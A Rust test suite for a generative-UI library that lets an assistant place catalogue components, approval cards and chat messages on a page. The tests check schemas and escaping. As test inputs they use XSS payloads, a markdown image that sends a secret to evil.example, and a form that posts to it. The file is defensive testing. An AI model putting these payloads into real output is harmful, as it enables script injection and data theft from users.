//! What an assistant may put on a page: the catalogue of components a model may choose,
//! whose schema, prompt, check and example agree for every type; the frame a chosen
//! component is drawn in, which takes out anything that could act; and the parts of a
//! conversation, which draw a model's words as text.

use navree_ui::genui::{
    Action, ActionButton, ActionDone, AppError, AppLink, BoxFuture, Catalog, Day, Int, Key, List,
    Prop, Props, RunAction, Surface, SurfaceCx, SurfaceView, UserText,
};
use proptest::prelude::*;
use serde_json::{Map, Value, json};

/// A reader who may read everything and refund when `manager`.
struct Reader {
    manager: bool,
}

impl SurfaceCx for Reader {
    fn can(&self, action: &str, _subject: &str) -> bool {
        action == "read" || self.manager
    }
}

navree_ui::choices! {
    /// The days the numbers cover.
    pub enum Period {
        /// Today so far.
        Today = "today",
        /// Monday to now.
        ThisWeek = "this_week",
        /// The first of the month to now.
        ThisMonth = "this_month",
    }
}

navree_ui::choices! {
    /// How a customer paid.
    pub enum Method {
        /// UPI.
        Upi = "upi",
        /// A debit or credit card.
        Card = "card",
        /// Net banking.
        NetBanking = "net_banking",
        /// Cash on delivery.
        Cod = "cod",
    }
}

navree_ui::props! {
    /// How payments did over a period, split by method, as a donut.
    pub struct PaymentsByMethod {
        /// The period.
        pub period: Period,
        /// Only this method. Leave out for every method.
        pub method: Option<Method>,
    }
}

navree_ui::props! {
    /// One row of a comparison: a method and a caption.
    pub struct Row {
        /// The method.
        pub method: Method,
        /// What the row says.
        pub caption: UserText<60>,
    }
}

navree_ui::props! {
    /// Orders compared side by side, with a link to each.
    pub struct Compare {
        /// The orders, by key.
        pub orders: List<Key, 5>,
        /// The rows.
        pub rows: List<Row, 4>,
        /// How many days back.
        pub days: Int<1, 90>,
        /// Since this day. Leave out for the period's start.
        pub since: Option<Day>,
        /// Where the heading links to.
        pub page: Option<AppLink>,
        /// Whether to show refunds too.
        pub refunds: bool,
        /// A heading.
        pub heading: Option<UserText<80>>,
    }
}

navree_ui::props! {
    /// An order, to refund.
    pub struct OrderInput {
        /// The order's key.
        pub order: Key,
    }
}

struct Payments;

impl Surface<Reader> for Payments {
    type Props = PaymentsByMethod;
    const NAME: &'static str = "payments_by_method";
    const CAN: Option<(&'static str, &'static str)> = Some(("read", "Payment"));

    fn title(&self, _props: &PaymentsByMethod) -> String {
        "Payments by method".to_owned()
    }

    fn render<'a>(
        &'a self,
        props: &'a PaymentsByMethod,
        _cx: &'a Reader,
    ) -> BoxFuture<'a, Result<SurfaceView, AppError>> {
        Box::pin(async move { Ok(SurfaceView::new(props.period.as_str())) })
    }
}

struct Comparison;

impl Surface<Reader> for Comparison {
    type Props = Compare;
    const NAME: &'static str = "compare_orders";
    const ACTIONS: &'static [&'static str] = &["refund_order"];

    fn title(&self, props: &Compare) -> String {
        props
            .heading
            .as_ref()
            .map_or_else(|| "Orders".to_owned(), |h| h.as_str().to_owned())
    }

    fn render<'a>(
        &'a self,
        props: &'a Compare,
        _cx: &'a Reader,
    ) -> BoxFuture<'a, Result<SurfaceView, AppError>> {
        Box::pin(async move {
            let mut view = SurfaceView::new(navree_ui::Node::list(
                props
                    .rows
                    .items()
                    .iter()
                    .map(|row| navree_ui::Node::from(row.caption.clone()))
                    .collect::<Vec<_>>(),
            ));
            for order in props.orders.items() {
                view = view.action(ActionButton::new::<RefundOrder>(
                    format!("Refund {order}"),
                    &OrderInput {
                        order: order.clone(),
                    },
                ));
            }
            Ok(view)
        })
    }
}

struct RefundOrder;

impl Action for RefundOrder {
    type Input = OrderInput;
    const NAME: &'static str = "refund_order";
    const CAN: Option<(&'static str, &'static str)> = Some(("refund", "Order"));
    const DESTRUCTIVE: bool = true;
}

impl RunAction<Reader> for RefundOrder {
    fn run<'a>(
        &'a self,
        input: OrderInput,
        _cx: &'a Reader,
    ) -> BoxFuture<'a, Result<ActionDone, AppError>> {
        Box::pin(async move { Ok(ActionDone::new(format!("Refunded order {}", input.order))) })
    }
}

fn catalog() -> Catalog<Reader> {
    Catalog::new()
        .surface(Payments)
        .surface(Comparison)
        .action(RefundOrder)
        .link("/orders/{key}")
        .link("/customers/{key}/orders")
}

// ---------------------------------------------------------------------------
// A small JSON Schema reader: exactly the keywords the catalogue writes, read by
// their meaning in the standard, so the catalogue's check can be held to its schema.
// ---------------------------------------------------------------------------

fn is_key_text(text: &str) -> bool {
    !text.is_empty()
        && text
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
}

fn is_path_text(text: &str) -> bool {
    text.starts_with('/')
        && text[1..]
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'/' | b'-'))
}

/// Whether `value` meets `schema`; the keywords the reader doesn't know fail it, so a
/// new keyword can't pass unread.
fn meets(schema: &Value, value: &Value) -> Result<(), String> {
    let schema = schema.as_object().ok_or("a schema is an object")?;
    for key in schema.keys() {
        let known = [
            "type",
            "enum",
            "description",
            "minLength",
            "maxLength",
            "minimum",
            "maximum",
            "pattern",
            "format",
            "items",
            "maxItems",
            "properties",
            "required",
            "additionalProperties",
        ];
        if !known.contains(&key.as_str()) {
            return Err(format!("unknown keyword {key}"));
        }
    }
    if let Some(kind) = schema.get("type").and_then(Value::as_str) {
        let ok = match kind {
            "string" => value.is_string(),
            "integer" => value.as_i64().is_some(),
            "boolean" => value.is_boolean(),
            "array" => value.is_array(),
            "object" => value.is_object(),
            other => return Err(format!("unknown type {other}")),
        };
        if !ok {
            return Err(format!("{value} is not a {kind}"));
        }
    }
    if let Some(words) = schema.get("enum").and_then(Value::as_array)
        && !words.contains(value)
    {
        return Err(format!("{value} is not in the enum"));
    }
    if let Some(text) = value.as_str() {
        let length = text.chars().count() as u64;
        if let Some(least) = schema.get("minLength").and_then(Value::as_u64)
            && length < least
        {
            return Err("too short".into());
        }
        if let Some(most) = schema.get("maxLength").and_then(Value::as_u64)
            && length > most
        {
            return Err("too long".into());
        }
        match schema.get("pattern").and_then(Value::as_str) {
            None => {}
            Some("^[A-Za-z0-9_-]+$") if is_key_text(text) => {}
            Some("^/[A-Za-z0-9_./-]*$") if is_path_text(text) => {}
            Some(pattern) => return Err(format!("{text} does not match {pattern}")),
        }
        if schema.get("format").and_then(Value::as_str) == Some("date")
            && chrono::NaiveDate::parse_from_str(text, "%Y-%m-%d").is_err()
        {
            return Err(format!("{text} is not a date"));
        }
    }
    if let Some(number) = value.as_i64() {
        if let Some(least) = schema.get("minimum").and_then(Value::as_i64)
            && number < least
        {
            return Err("below the minimum".into());
        }
        if let Some(most) = schema.get("maximum").and_then(Value::as_i64)
            && number > most
        {
            return Err("above the maximum".into());
        }
    }
    if let Some(items) = value.as_array() {
        if let Some(most) = schema.get("maxItems").and_then(Value::as_u64)
            && items.len() as u64 > most
        {
            return Err("too many items".into());
        }
        if let Some(item) = schema.get("items") {
            for value in items {
                meets(item, value)?;
            }
        }
    }
    if let Some(object) = value.as_object() {
        let properties = schema
            .get("properties")
            .and_then(Value::as_object)
            .cloned()
            .unwrap_or_default();
        for name in schema
            .get("required")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
        {
            let name = name.as_str().unwrap();
            if !object.contains_key(name) {
                return Err(format!("{name} is required"));
            }
        }
        for (name, value) in object {
            match properties.get(name) {
                Some(schema) => meets(schema, value)?,
                None if schema.get("additionalProperties") == Some(&json!(false)) => {
                    return Err(format!("{name} is not allowed"));
                }
                None => {}
            }
        }
    }
    Ok(())
}

/// A value of each JSON type, for type flips.
fn every_type() -> Vec<Value> {
    vec![
        json!(null),
        json!(true),
        json!(7),
        json!(-1.5),
        json!("text"),
        json!([]),
        json!({}),
    ]
}

#[test]
fn every_tool_is_named_and_described_from_its_props() {
    let catalog = catalog();
    let tools = catalog.all_tools();
    let names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
    assert_eq!(names, ["show_compare_orders", "show_payments_by_method"]);
    for tool in &tools {
        assert!(tool.name.starts_with("show_"));
        assert_eq!(tool.parameters["type"], "object", "{}", tool.name);
        assert_eq!(
            tool.parameters["additionalProperties"], false,
            "{}",
            tool.name
        );
    }
    let payments = tools
        .iter()
        .find(|t| t.name == "show_payments_by_method")
        .unwrap();
    assert!(
        payments
            .description
            .starts_with(&PaymentsByMethod::description()),
        "{}",
        payments.description
    );
    assert_eq!(
        payments.parameters["properties"]["period"]["enum"],
        json!(["today", "this_week", "this_month"])
    );
    assert!(
        payments.parameters["properties"]["period"]["description"]
            .as_str()
            .unwrap()
            .contains("this_week: Monday to now.")
    );
    assert_eq!(payments.parameters["required"], json!(["period"]));
    // The prompt names the pages a component may link to, and nothing else the model
    // could mistake for an action.
    let prompt = catalog.prompt();
    assert!(prompt.contains("/orders/{key}"), "{prompt}");
    assert!(prompt.contains("/customers/{key}/orders"), "{prompt}");
    assert!(prompt.contains("approval"), "{prompt}");
    assert!(Catalog::<Reader>::new().prompt().is_empty());
}

#[test]
fn schema_check_and_example_agree_for_every_component() {
    let catalog = catalog();
    for tool in catalog.all_tools() {
        let schema = &tool.parameters;
        let (_, example) = catalog
            .examples()
            .into_iter()
            .find(|(name, _)| *name == tool.name)
            .unwrap();
        // The example passes the check, and what is stored meets the schema.
        let checked = catalog
            .check_example(&tool.name, &example)
            .unwrap_or_else(|r| panic!("{}: {r}", tool.name));
        meets(schema, &checked.props).unwrap_or_else(|e| panic!("{}: {e}", tool.name));
        // What is stored checks again to itself.
        let again = catalog.check_example(&tool.name, &checked.props).unwrap();
        assert_eq!(again.props, checked.props, "{}", tool.name);

        let properties = schema["properties"].as_object().unwrap();
        let required: Vec<&str> = schema["required"]
            .as_array()
            .unwrap()
            .iter()
            .map(|v| v.as_str().unwrap())
            .collect();
        for name in properties.keys() {
            let mut without = example.as_object().unwrap().clone();
            without.remove(name);
            let result = catalog.check_example(&tool.name, &Value::Object(without));
            // A property the schema requires is required by the check, and only those.
            assert_eq!(
                result.is_err(),
                required.contains(&name.as_str()),
                "{}.{name}: {result:?}",
                tool.name
            );
            // A value of a type the schema refuses, the check refuses.
            for wrong in every_type() {
                let mut flipped = example.as_object().unwrap().clone();
                flipped.insert(name.clone(), wrong.clone());
                let flipped = Value::Object(flipped);
                let schema_says = meets(schema, &flipped).is_ok();
                if !schema_says && !(wrong.is_null() && !required.contains(&name.as_str())) {
                    assert!(
                        catalog.check_example(&tool.name, &flipped).is_err(),
                        "{}.{name} = {wrong}: the schema refuses it, the check took it",
                        tool.name
                    );
                }
            }
        }
        // A property the schema doesn't name is refused.
        let mut extra = example.as_object().unwrap().clone();
        extra.insert("html".to_owned(), json!("<b>"));
        assert!(meets(schema, &Value::Object(extra.clone())).is_err());
        assert!(
            catalog
                .check_example(&tool.name, &Value::Object(extra))
                .is_err()
        );
    }
}

#[test]
fn a_tool_outside_the_catalogue_is_refused() {
    let catalog = catalog();
    for tool in [
        "show_approval",
        "approve",
        "show_",
        "show_payments_by_method ",
        "SHOW_PAYMENTS_BY_METHOD",
        "show_payments_by_method\u{0}",
    ] {
        let refusal = catalog
            .check(tool, &json!({ "period": "today" }))
            .unwrap_err();
        assert!(refusal.message().contains("no component"), "{refusal}");
    }
}

#[test]
fn the_check_says_what_to_repair() {
    let catalog = catalog();
    let refusal = catalog
        .check(
            "show_compare_orders",
            &json!({
                "orders": ["1042", "a b"],
                "rows": [{ "method": "UPI", "caption": "ok" }],
                "days": 120,
                "page": "https://evil.example/orders/1",
                "refunds": "yes",
                "style": "color:red",
            }),
        )
        .unwrap_err();
    let message = refusal.message();
    for part in [
        "orders[1]",
        "rows[0].method",
        "days: must be from 1 to 90",
        "page: must be a page of this app",
        "refunds: must be true or false",
        "style: is not a property here",
    ] {
        assert!(message.contains(part), "{part} missing from: {message}");
    }
}

#[test]
fn a_catalogue_costs_a_known_number_of_tokens() {
    // The cost of the catalogue in every request is measured, and kept
    // small enough that a dozen components fit in a model's tools.
    let tokens = catalog().prompt_tokens();
    println!("catalogue prompt tokens: {tokens}");
    assert!(tokens > 50 && tokens < 1_500, "{tokens}");
}

/// Arbitrary JSON, small and deep enough to reach every branch of the check.
fn arbitrary_json() -> impl Strategy<Value = Value> {
    let leaf = prop_oneof![
        Just(Value::Null),
        any::<bool>().prop_map(Value::Bool),
        any::<i64>().prop_map(|n| json!(n)),
        (-1.0e6f64..1.0e6).prop_map(|n| json!(n)),
        "[a-z_]{0,12}".prop_map(Value::String),
        prop::sample::select(vec![
            "today",
            "this_week",
            "upi",
            "card",
            "/orders/1042",
            "/orders/../x",
            "1042",
            "2026-11-06",
            "2026-02-30",
            "<script>",
            "a\u{202E}b",
            "",
        ])
        .prop_map(|s| Value::String(s.to_owned())),
    ];
    leaf.prop_recursive(5, 64, 8, |inner| {
        prop_oneof![
            prop::collection::vec(inner.clone(), 0..8).prop_map(Value::Array),
            prop::collection::btree_map(
                prop::sample::select(vec![
                    "period",
                    "method",
                    "orders",
                    "rows",
                    "caption",
                    "days",
                    "since",
                    "page",
                    "refunds",
                    "heading",
                    "html",
                    "__proto__",
                ])
                .prop_map(str::to_owned),
                inner,
                0..8
            )
            .prop_map(|map| Value::Object(map.into_iter().collect::<Map<String, Value>>())),
        ]
    })
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(4_000))]

    /// Whatever a model sends, the check never panics; what it takes meets the
    /// schema the model was given, and checks again to itself.
    #[test]
    fn whatever_is_sent_what_passes_meets_the_schema(value in arbitrary_json()) {
        let catalog = catalog();
        for tool in catalog.all_tools() {
            if let Ok(checked) = catalog.check(&tool.name, &value) {
                prop_assert!(meets(&tool.parameters, &checked.props).is_ok(), "{} took {}", tool.name, value);
                let again = catalog.check(&tool.name, &checked.props).unwrap();
                prop_assert_eq!(again.props, checked.props);
            }
        }
    }

    /// A text prop never holds what the check refuses, whatever the characters.
    #[test]
    fn text_never_holds_a_control_or_a_turning_mark(text in "\\PC{0,80}|[\\x00-\\x1f\\u{202a}-\\u{202e}a-z]{0,20}") {
        if let Ok(checked) = UserText::<80>::new(&text) {
            let kept = checked.as_str();
            prop_assert!(!kept.is_empty(), "empty text kept");
            prop_assert!(
                kept.chars().all(|c| !c.is_control() || c == '\n' || c == '\t'),
                "a control character in {:?}",
                kept
            );
            prop_assert!(
                !kept.chars().any(|c| ('\u{202A}'..='\u{202E}').contains(&c)),
                "a turning mark in {:?}",
                kept
            );
        }
    }
}

#[test]
fn prop_types_round_trip() {
    let links = [navree_ui::genui::LinkPattern::parse("/orders/{key}").unwrap()];
    let mut checker = navree_ui::genui::Checker::new(&links);
    let day = Day::check(&json!("2026-11-06"), "since", &mut checker).unwrap();
    assert_eq!(day.to_json(), json!("2026-11-06"));
    assert!(Day::check(&json!("06/11/2026"), "since", &mut checker).is_none());
    assert!(Day::check(&json!("3026-11-06"), "since", &mut checker).is_none());
    let days = Int::<1, 90>::check(&json!(7.0), "days", &mut checker).unwrap();
    assert_eq!(days.to_json(), json!(7));
    assert!(Int::<1, 90>::check(&json!(7.5), "days", &mut checker).is_none());
    let key = Key::<64>::check(&json!(1042), "order", &mut checker).unwrap();
    assert_eq!(key.to_json(), json!("1042"));
    let link = AppLink::check(&json!("/orders/1042"), "page", &mut checker).unwrap();
    assert_eq!(link.href().as_str(), "/orders/1042");
}

// ---------------------------------------------------------------------------
// The conversation's parts
// ---------------------------------------------------------------------------

use navree_ui::genui::{
    ApprovalCard, ChatLabels, ChatMessage, ChatState, Conversation, PromptInput, Suggestions,
    ToolCallCard, ToolState, chat_notice,
};
use navree_ui::{LiveStream, render};

/// A conversation in every state a page draws: the reader's words, a finished answer, a
/// tool that ran, a notice and an answer still being written.
fn conversation_html() -> String {
    let labels = ChatLabels::default();
    let stream = LiveStream::topics(["assistant.7"]);
    render(
        &Conversation::new("conversation", "/assistant/7/items")
            .items([
                ChatMessage::user("u1", "0001", "How did UPI do this week?").into_item(&labels),
                ToolCallCard::new("t1", "0002", "Looked up payments")
                    .state(ToolState::Done)
                    .arguments(json!({ "period": "this_week" }))
                    .into_item(&labels),
                ChatMessage::assistant("a1", "0003", "UPI took **62%** of payments.")
                    .into_item(&labels),
                chat_notice("n1", "0004", "Refunded order CS-1042"),
                ChatMessage::assistant("a2", "0005", "Looking at refunds")
                    .state(ChatState::Writing)
                    .stop("/assistant/7/stop", Some("tok".into()))
                    .into_item(&labels),
            ])
            .since("12")
            .live(stream.on("assistant.7"))
            .into(),
    )
}

#[test]
fn a_conversation_is_a_live_list_that_starts_at_the_newest() {
    let html = conversation_html();
    assert!(html.contains(r#"data-genui="conversation""#), "{html}");
    // A section of its own: a component's title and an answer's headings are level 3.
    assert!(
        html.contains(r#"<h2 data-ui-sr="">Conversation</h2>"#),
        "{html}"
    );
    assert!(html.contains(r#"data-ui-order="asc""#), "{html}");
    // Drawn as nothing is changing, it fetches only when it hears something.
    assert!(!html.contains("data-ui-live-catch-up"), "{html}");
    assert!(html.contains(r#"data-ui-live-at="end""#), "{html}");
    assert!(
        html.contains(r#"data-ui-live-event="assistant.7""#),
        "{html}"
    );
    assert!(html.contains(r#"data-ui-since="12""#), "{html}");
    // Finished answers are read out once, politely; the one being written is quiet and
    // listed under its writing key, so it is read out when it comes back finished.
    assert!(
        html.contains(r#"data-l-new-one="The assistant answered""#),
        "{html}"
    );
    assert!(html.contains(r#"data-key="a2.w""#), "{html}");
    assert!(
        html.contains(r#"data-ui-say="The assistant answered: UPI took **62%** of payments.""#),
        "{html}"
    );
    assert!(
        !html.contains(r#"role="log""#),
        "a log would read an answer out as it grows"
    );
    assert_eq!(html.matches(r#"aria-busy="true""#).count(), 1, "{html}");
}

#[test]
fn every_part_works_with_no_script() {
    // The parts are links and forms; the composer posts like any form.
    let composer = render(
        &PromptInput::new("composer", "/assistant/7/messages")
            .csrf("tok")
            .into(),
    );
    assert!(
        composer.contains(r#"<form method="post" action="/assistant/7/messages""#),
        "{composer}"
    );
    assert!(composer.contains(r#"type="submit""#), "{composer}");
    let suggestions = render(
        &Suggestions::new("/assistant/7/messages")
            .csrf("tok")
            .suggestion("How did UPI do this week?")
            .into(),
    );
    assert!(
        suggestions.contains(r#"name="message" value="How did UPI do this week?""#),
        "{suggestions}"
    );
    let html = conversation_html();
    assert!(
        html.contains(r#"<form method="post" action="/assistant/7/stop""#),
        "{html}"
    );
}

#[test]
fn hostile_words_from_a_model_stay_words() {
    let labels = ChatLabels::default();
    for hostile in [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "[click](javascript:alert(1))",
        "![leak](https://evil.example/?q=secret)",
        "<form action=https://evil.example><button>Approve</button></form>",
        "\"><svg onload=alert(1)>",
    ] {
        let html = render(
            &ChatMessage::assistant("a", "1", hostile)
                .into_item(&labels)
                .into(),
        );
        let lower = html.to_ascii_lowercase();
        assert!(!lower.contains("<script"), "{html}");
        assert!(!lower.contains("<img"), "{html}");
        assert!(!lower.contains("<form"), "{html}");
        assert!(!lower.contains("<svg onload"), "{html}");
        assert!(!lower.contains(r#"href="javascript"#), "{html}");
        let tool = render(
            &ToolCallCard::new("t", "1", hostile)
                .arguments(json!({ "note": hostile }))
                .into_item(&labels)
                .into(),
        );
        assert!(!tool.to_ascii_lowercase().contains("<script"), "{tool}");
        assert!(!tool.to_ascii_lowercase().contains("<img"), "{tool}");
    }
}

#[test]
fn an_approval_card_is_set_apart_and_names_what_it_approves() {
    let html = render(
        &ApprovalCard::new(
            "call_9",
            "Refund an order",
            json!({ "order": "CS-1042", "amount": 125000, "note": "<b>now</b>", "full": true }),
        )
        .routes("/assistant/7/approve", "/assistant/7/reject")
        .csrf("tok")
        .into(),
    );
    assert!(html.contains(r#"data-genui="approval""#), "{html}");
    assert!(html.contains(r#"role="region""#), "{html}");
    assert!(
        html.contains("The assistant asks to: Refund an order"),
        "{html}"
    );
    assert!(html.contains("<dt>order</dt><dd>CS-1042</dd>"), "{html}");
    assert!(html.contains("<dt>full</dt><dd>yes</dd>"), "{html}");
    assert!(html.contains("&lt;b&gt;now&lt;/b&gt;"), "{html}");
    assert!(html.contains(r#"action="/assistant/7/approve""#), "{html}");
    assert!(html.contains(r#"action="/assistant/7/reject""#), "{html}");
    assert_eq!(
        html.matches(r#"name="call_id" value="call_9""#).count(),
        2,
        "{html}"
    );
    assert_eq!(
        html.matches(r#"name="_csrf" value="tok""#).count(),
        2,
        "{html}"
    );
    assert!(html.contains(r#"name="reason""#), "{html}");
}
